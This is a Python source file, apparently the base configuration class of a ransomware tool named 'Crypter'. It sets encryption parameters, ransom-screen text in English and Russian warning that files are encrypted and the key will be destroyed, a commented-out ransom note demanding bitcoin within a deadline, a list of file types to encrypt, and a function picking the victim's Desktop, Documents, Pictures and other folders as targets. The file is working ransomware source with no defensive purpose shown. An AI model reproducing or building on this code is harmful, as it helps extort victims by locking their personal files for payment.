# -*- coding: utf-8 -*-
'''
@summary: Crypter: Base class for inheritence
@author: MLS
'''

# Import libs
import os
import locale

# Import classes

################
## Base class ##
################
class Base():
    '''
    @summary: Base Class. Defines schema for Crypter
    @todo: Continue with defining GUI schema
    '''

    # CORE SCHEMA
    BLOCK_SIZE_BYTES = 8192
    IV_SIZE = 16
    PADDING_BLOCK_SIZE = 16
    MAX_FILE_SIZE_BYTES = 536870912
    REGISTRY_LOCATION = r"SOFTWARE\\Crypter"
    RUNTIME_CONFIG_FILE = "runtime.cfg"
    BTC_BUTTON_URL = "https://www.coindesk.com/information/what-is-bitcoin/"

    # Get locale 
    if "ru" in locale.getdefaultlocale():
        #LANG = "ru"
        LANG = "eng"
    else:
        LANG = "eng"
    
    # GUI SCHEMA
    GUI_IMAGE_LOGO = "lock.bmp"
    GUI_LABEL_TEXT_TITLE = {
        "eng": "CRYPTER",
        "ru": u"КРИПТЕР"
        }
    GUI_LABEL_TEXT_FLASHING_ENCRYPTED = {
        "eng": "YOUR FILES HAVE BEEN ENCRYPTED!",
        "ru": u"ВАШИ ФАЙЛИ БЫЛИ ЗАШИФРАНЫ!"
    }
    GUI_LABEL_TEXT_FLASHING_DECRYPTED = {
        "eng": "YOUR FILES HAVE BEEN DECRYPTED!",
        "ru": u"ВАШИ ФАЙЛЫ БЫЛИ РАСШИФРАНЫ!"
    }
    GUI_LABEL_TEXT_FLASHING_DESTROYED = {
        "eng": "YOUR DECRYPTION KEY HAS BEEN DESTROYED!",
        "ru": u"ВАШИ ФАЙЛЫ БЫЛИ РАСШИФРАНЫ!"
    }
    GUI_LABEL_TEXT_TIME_REMAINING = {
        "eng": "TIME REMAINING",
        "ru": u"РАЗРУШЕНИЕ КЛЮЧА ЧЕРЕЗ: "
    }
    GUI_LABEL_TEXT_WALLET_ADDRESS = {
        "eng": "WALLET ADDRESS: ",
        "ru": u"АДРЕС КОШЕЛЬКА: "
    }
    GUI_LABEL_TEXT_BITCOIN_FEE = {
        "eng": "BITCOIN FEE: ",
        "ru": u"АДРЕС КОШЕЛЬКА: "
    }
    GUI_LABEL_TEXT_TIME_BLANK = {
        "eng": "--------",
        "ru": u"KEY DESTROYED"
    }
    GUI_BUTTON_TEXT_VIEW_ENCRYPTED_FILES = {
        "eng": "View Encrypted Files",
        "ru": u"View Encrypted Files"
    }
    GUI_BUTTON_TEXT_ENTER_DECRYPTION_KEY = {
        "eng": "Enter Decryption Key",
        "ru": u"Enter Decryption Key"
    }
    GUI_DECRYPTION_DIALOG_LABEL_TEXT_INVALID_KEY = {
        "eng": "Invalid Key!",
        "ru": u"Invalid Key!"
    }
    GUI_DECRYPTION_DIALOG_LABEL_TEXT_WAITING = {
        "eng": "Waiting for input",
        "ru": u"Waiting for input"
    }
    GUI_DECRYPTION_DIALOG_LABEL_TEXT_DECRYPTING = {
        "eng": "Decrypting! Please Wait",
        "ru": u"Decrypting! Please Wait"
    }
    GUI_DECRYPTION_DIALOG_LABEL_TEXT_FINISHED = {
        "eng": "Decryption Complete!",
        "ru": u"Decryption Complete!"
    }
    GUI_DECRYPTION_DIALOG_LABEL_TEXT_FILE_COUNT = {
        "eng": "Encrypted Files: ",
        "ru": u"Encrypted Files: "
    }
    GUI_ENCRYPTED_FILES_DIALOG_NO_FILES_FOUND = {
        "eng": "A list of encrypted files was not found",
        "ru": u"A list of encrypted files was not found"
    }
    
    '''
    @note: Not currently being used because this needs to be defined at a later point
    to bring in the runtime config settings
    GUI_RANSOM_MESSAGE = {
        "eng": (
          "The important files on your computer have been encrypted with"
          " military grade AES-256 bit encryption.\n\nYour documents, videos"
          " images and other forms of data are now inaccessible, and cannot"
          " be unlocked without the decryption key. This key is currently"
          " being stored on a remote server.\n\nTo acquire this key, transfer"
          " a total of %s BTC to the Bitcoin wallet address below within %s"
          " hours.\n\nIf you fail to take action within this time window,"
          " the decryption key will be destroyed and access to your files"
          " will be permanently lost." % 
          (BITCOIN_FEE, (KEY_DESTRUCT_TIME_SECONDS / 60 / 60))
          ),
        "ru": (
          u"The important files on your computer have been encrypted with"
          u" military grade AES-256 bit encryption.\n\nYour documents, videos"
          u" images and other forms of data are now inaccessible, and cannot"
          u" be unlocked without the decryption key. This key is currently"
          u" being stored on a remote server.\n\nTo acquire this key, transfer"
          u" a total of %s BTC to the Bitcoin wallet address below within %s"
          u" hours.\n\nIf you fail to take action within this time window,"
          u" the decryption key will be destroyed and access to your files"
          u" will be permanently lost." % 
          (BITCOIN_FEE, (KEY_DESTRUCT_TIME_SECONDS / 60 / 60))
          )
        }
    '''
                          

    FILETYPES = [
                # GENERAL FORMATS
                "sln",

                # IMAGE FORMATS
                "jpg", "png",

                # VIDEO FORMATS
                "mp4", "avi", "mkv",

                # DOCUMENT FORMATS
                "doc", "docx", "txt", "pdf",

                # SOUND FORMATS
                "mp3",

                # EXE FORMATS
                "exe", "msi", "php",

                # COMPRESSION FORMATS
                "tgz", "zip", "rar"
                ]
    
    
    FILES_TO_EXCLUDE = [
        "key.txt"
        ]
    

    def get_base_dirs(self, home_dir):
      # Function to return a list of base directories to encrypt
      # TODO Detect presence of network drives
      # TODO Improve overall functionality for getting list of locations to encrypt

      base_dirs = [
                    os.path.join(home_dir, "Desktop"),
                    os.path.join(home_dir, "Documents"),
                    os.path.join(home_dir, "Downloads"),
                    os.path.join(home_dir, "Music"),
                    os.path.join(home_dir, "Pictures"),
                    os.path.join(home_dir, "Videos")
                  ]

      return base_dirs

